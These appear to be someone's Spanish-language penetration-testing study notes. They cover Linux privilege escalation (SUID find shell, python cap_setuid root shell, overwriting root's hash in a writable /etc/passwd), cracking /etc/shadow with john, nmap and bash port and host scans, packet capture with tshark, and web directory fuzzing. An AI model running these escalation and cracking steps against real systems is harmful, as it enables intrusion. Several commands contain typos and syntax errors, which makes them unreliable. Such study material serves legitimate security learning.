"""
Al filtrar con grep si utilizamos el $ al final indicamos que quremos que termine necesariamente como
la cadena ingresada preaviamente y ^ para que empieze

cat /etc/passwd | grep sh$ | awk '{print $1}' FS=':'

chattr -----> controlar permisos avanzados 

?$ chattr +i -V
i ----> ni root podra borrar
-V ----> verbose
lsattr ---> listar permisos especiales

gtfobins.github.io ---> se puede buscar por comandos y vulneravilidades

Por ejemplo si el binario find tuviese permisos suid

find . -exec /bin/sh -p \; -quit

?$ uname -a  

?$ lsb_release -a

Fuerza bruta al etc/shadow 

?$ cat /etc/shadow | grep 'x' > to_break

?$ john --wordlist=rockyou.txt to_break 

?$ john --show to_break

Identificar hashes

hash-identifier 
hashid {hash}

Si el archivo etc/passwd tiene permisos de escritura se puede alterar la contraseña

?$ openssl passwd 

Una vez tengamos el hash DES(Unix) podemos alterar el etc/passwd

root:x:0:0:root:/root:/usr/bin/zsh

root:{hash_passwd}:0:0:root:/root:/usr/bin/zsh

Scrip en C con root


-----

# include <stdio.h>

setuid(0)   <--- Esto porque en C existe una medida de seguridad

void main(){
    printf("Listando procesos (usr/bin/ps):");
    system("/usr/bin/ps);

    printf("Listando procesos (ps):");
    system("ps);
}

El archivo tendra SUID

El explotar una vulneravilidad y intentar escalar privilegios en un sistema puede ser desgastante, aca entran
en juego las persistencias, para que si llegaramos a apagar la maquina poder seguir teniendo conexion.
U otras como las persistencias privilegiadas...

Capabilities:

?$ getcap -r / 2>/dev/null 
Listar las capabilities desde la raiz

Por ejemplo podriamos tener la capabilitie de cap_setuid+ep en python en donde el atacante podria setearse la id de manera
exitosa para recobrar axeso como root al sistema

?$ python3 -c 'import os; os.setuid(0); os.sistem("/bin/bash")'
¿'
?$ setcap -r /usr/bin/pyhton3

?$ getcap

?$ setcap cap_setuid+ep

------------

?$ ping -c 1 {ip} -R  
-R <-- flag para mostrar el Recorod Route

nmp -p- -T5 --opne -n -v {ip} -oG {file_name}

nmap -sC -sV -p{ports} {ip} -oN {file_name}

?$ whatweb http://{ip}
Para ver lo más relevante de una app web

Para un escaneo más rapido 

?$ nmap -p- -oS- --min-rate 5000 --open -vvv -n -Pn {ip}
-Pn ---> no host discovery
-n ----> no resolución dns

#!/bin/bash

for port in $(seq 1 65535); do
    echo '' > /dev/tcp/{ip}/port && echo 'Port open'
done

Ctrl + z ----> pasar al segundo plano
kill % ---> matar al proceso enviado a segundo plano 

Identificar activos en tu segmento de red

#!/bin/bash

for i in $(seq 2 254); do
    timeout 1 bash -c "ping -c 1 {ip}.$i > dev/null 2>&1" && echo "Host {ip}.$i - ACTIVE"
done; wait

* NMAP
Enumerar puertos, vulneravilidades

updatedb

locate .nse      <----- scripts de nmap
locate .nse | wc -l    <---- Contar los scrips
locate .nse | xargs grep "categories"   <----- ver las categorias de los scripts
locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u

nmap -445 {ip} --script "vulnv and safe"
Escanear el port 445 de la ip ingresada con scripts de categorias vulnv and safe

*Listar directorios con nmap

nmap -p{port} {ip} --script http-enum

? Fuzing ---> fuerza bruta de urls 

Analizando el trafico

?$ tcpdump -i tun0 -w Captura.cap -v
interfaz tun0, exportar todo al archivo Captura.cap y verabose

?$ tshark -r Captura.cap 
Tshark nos traducira la captura de datos

?$ tshark -r -Y "http" Captura.cap 
Tshark nos traducira la captura de datos filtrandolea por http

?$ tshark -r -Y "http" -Tjson Captura.cap 
Tshark nos traducira la captura de datos filtrandolea por http en formato json

?$ tshark -r -Y "http" -Tfields -e tcp.payload Captura.cap 
Tshark nos traducira la captura de datos filtrandolea por http

xxd -ps ---> transformar a hexadecimal
xxd -ps -r ----> reversear de hexadecimal a legible

?$ tshark -r -Y "http" -Tfields -e tcp.payload Captura.cap | xxd -ps -r | grep 'GET' | awk '{print $2}' | sort -u

! Fuzing 
*WFUZZ

wfuzz -c -L -t 400 --hc=404 -w /usr/share/wordlist/dirbuster/directory-list-2,3-medium.txt http://{ip}/FUZZ
-c ---> outpu con colores
-L ----> si el codigo de estado es 301 y redirecciona, le indicamos que lo siga. follow redirec
-t ---> 400 hilos
--hc=404 ----> hide code 404
FUZZ en la url ----> donde quiero remplazar cada una de las palabras del diccionario en la url

--sc=200 ----> show code 
--sh=400 ----> + de 400 caracteres
--hh=4000 ----> ocultar respuestas con 4000 caracteres
--hl=160 ----> hide lines +160'

echo -e "txt/nhtml/nphp/n" > extenciones.txt

wfuzz -c -L -t 400 --hc=404 -w /usr/share/wordlist/dirbuster/directory-list-2,3-medium.txt -w extenciones.txt http://{ip}/FUZZ.FUZ2Z

doble fuzz, por cada una de las palabras del primer diccionario, probamos cada una de (en este caso extenciones) del segundo diccionario

*DIRBUSTER

GUI <-

*DIRB

dirb {target} -w {wordlist}

*GOBUSTER

gobuster dir -w {wordlist} --url {target}

*DIRSEAR

git clone
-h






"""